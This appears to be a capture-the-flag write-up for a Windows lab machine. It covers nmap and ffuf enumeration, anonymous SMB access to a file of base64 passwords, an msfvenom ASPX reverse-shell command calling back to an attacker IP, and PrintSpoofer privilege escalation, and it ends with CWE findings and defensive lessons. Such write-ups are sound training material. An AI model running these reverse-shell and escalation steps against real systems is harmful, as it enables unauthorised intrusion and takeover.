---
description: Penetration Testing Challenge
---

# Relevant

## Reconnaissance

As always i ran nmap to list open ports.

`sudo nmap -sC -sV -O -oN nmap/scan <IP>`

* **-sC**: run default nmap scripts
* **-sV**: detect service version
* **-O**: detect OS
* **-oN**: output normal format and store in file nmap/scan

I get back the following result showing that these ports are open:

* **Port 80**: running Microsoft IIS httpd 10.0
* **Port 135**: running Microsoft Windows RPC
* **Port 139/445**: are running SMB
* **Port 3389**: running Microsoft Terminal Services

<figure><img src="../../../../.gitbook/assets/image (23) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (24) (1).png" alt=""><figcaption></figcaption></figure>

In the meanwile i start an other scan but with all ports and parralel i will run dirbuster to get directories on the Webserver.

`sudo nmap -sC -sV -O -p- -oN nmap/scan <IP>`

* **-p-**: scan all ports

<figure><img src="../../../../.gitbook/assets/image (25) (1).png" alt=""><figcaption></figcaption></figure>

There are 3 new ports:

* **Port 49663**: runns Microsoft IIS httpd 10.0
* **Ports 49667/49669**: are running Microsoft Windows RCP

<figure><img src="../../../../.gitbook/assets/image (26) (1).png" alt=""><figcaption></figcaption></figure>

## Enumeration

I have to run dirbuster also on port <mark style="color:blue;">**49663**</mark> as a reminder.

First i run dirbuster on port <mark style="color:blue;">**80**</mark>.

<figure><img src="../../../../.gitbook/assets/image (27) (1).png" alt=""><figcaption></figcaption></figure>

I found no directories on port <mark style="color:blue;">**80**</mark>. That's probably a dead end.

So i tried port <mark style="color:blue;">**49663**</mark> with ffuf instead of dirbuster just to use an other tool and i get the <mark style="color:blue;">**nt4wrksv**</mark> directory.

<figure><img src="../../../../.gitbook/assets/image (28) (1).png" alt=""><figcaption></figcaption></figure>

**Ports 139 and 445 Samba2**

Running smbclient with no password to list the services:&#x20;

`smbclient -L <IP>`

<figure><img src="../../../../.gitbook/assets/image (29).png" alt=""><figcaption></figcaption></figure>

So i try to connect to samba without a password.

`smbclient \\\\<IP>\\nt4wrksv`

<figure><img src="../../../../.gitbook/assets/image (30).png" alt=""><figcaption></figcaption></figure>

Getting the `passwords.txt`

<figure><img src="../../../../.gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>

That looks like base64 encoded. So i decoded the strings with base64:

`echo Qm9iIC0gIVBAJCRXMHJEITEyMw== | base64 -d`

`Bob - !P@$$W0rD!123`

`echo QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk | base64 -d`

`Bill - Juw4nnaM4n420696969!$$$`

With ffuf i found the <mark style="color:blue;">**nt4wrksv**</mark> directory so i can also check the path within the <mark style="color:blue;">**passwords.txt**</mark> to proof that it exists on the server.

<figure><img src="../../../../.gitbook/assets/image (32).png" alt=""><figcaption></figcaption></figure>

To guarantee that this is the same directory as the shared folder i uploaded a test text file from my local machine to the shared folder and opened it in the browser (no screenshot available).

## Exploitation #1 ASPX (Reverse shell)

Setup the reverse shell with msfvenom:

`msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.2.15 LPORT=4444 -f aspx > shell.aspx`

<figure><img src="../../../../.gitbook/assets/image (33).png" alt=""><figcaption></figcaption></figure>

call the .aspx file from the browser and get a reverse shell:

<figure><img src="../../../../.gitbook/assets/image (34).png" alt=""><figcaption></figcaption></figure>

As in the screenshot shown above there is <mark style="color:blue;">**SeImpersonatePrivilege**</mark> enabled.

**Doing it the msfconsole way**

I started msfconsole -q and use the following settings:

`use exploit/multi/handler`

`set payload windows/x64/shell_reverse_tcp`

`set lhost 10.11.64.28`

`run`

Running <mark style="color:blue;">**post exploitation**</mark> to get an upgraded shell.

Background the current shell.

`sessions -u 1`

getting the <mark style="color:blue;">**PrintSpoofer64.exe**</mark> from [https://github.com/itm4n/PrintSpoofer/releases](https://github.com/itm4n/PrintSpoofer/releases) and upload it to the victim:

<figure><img src="../../../../.gitbook/assets/image (35).png" alt=""><figcaption></figcaption></figure>

**Privilege escalation (msfconsole)**

<figure><img src="../../../../.gitbook/assets/image (36).png" alt=""><figcaption></figcaption></figure>

**Doing it the netcat way**

Starting the netcat listener on port 4444 and calling the shell over the browser gives the access to bobs account.

<figure><img src="../../../../.gitbook/assets/image (37).png" alt=""><figcaption></figcaption></figure>

Changing the directory to c:\inetpub\wwwroot to upload the PrintSpooferx64.exe.

<figure><img src="../../../../.gitbook/assets/image (38).png" alt=""><figcaption></figcaption></figure>

That has failed. So i try it with the samba share.

<figure><img src="../../../../.gitbook/assets/image (39).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (40).png" alt=""><figcaption></figcaption></figure>

**Privilege escalation (netcat)**

<figure><img src="../../../../.gitbook/assets/image (41).png" alt=""><figcaption></figcaption></figure>

## Discovered vulnerabilities and weaknesses

* CWE-250: Execution with Unnecessary Privileges
* CWE-257: Storing Passwords in a Recoverable Format
* CWE-269: Improper Privilege Management
* CWE-521: Weak Password Requirements
* CWE-862: Missing Authorization

## Lessons learned

1. Never store passwords unprotected on the system. I mean store passwords in a passwordmanager instead of a file.
2. Never use weak passwords. That's why you use a passwordmanager.
3. Don't use the same shared folder on the system as for the webserver.
4. Bob is a local administrator on the computer. He has too much privileges enabled. Disable not used privileges like SeImpersonatePrivilege.

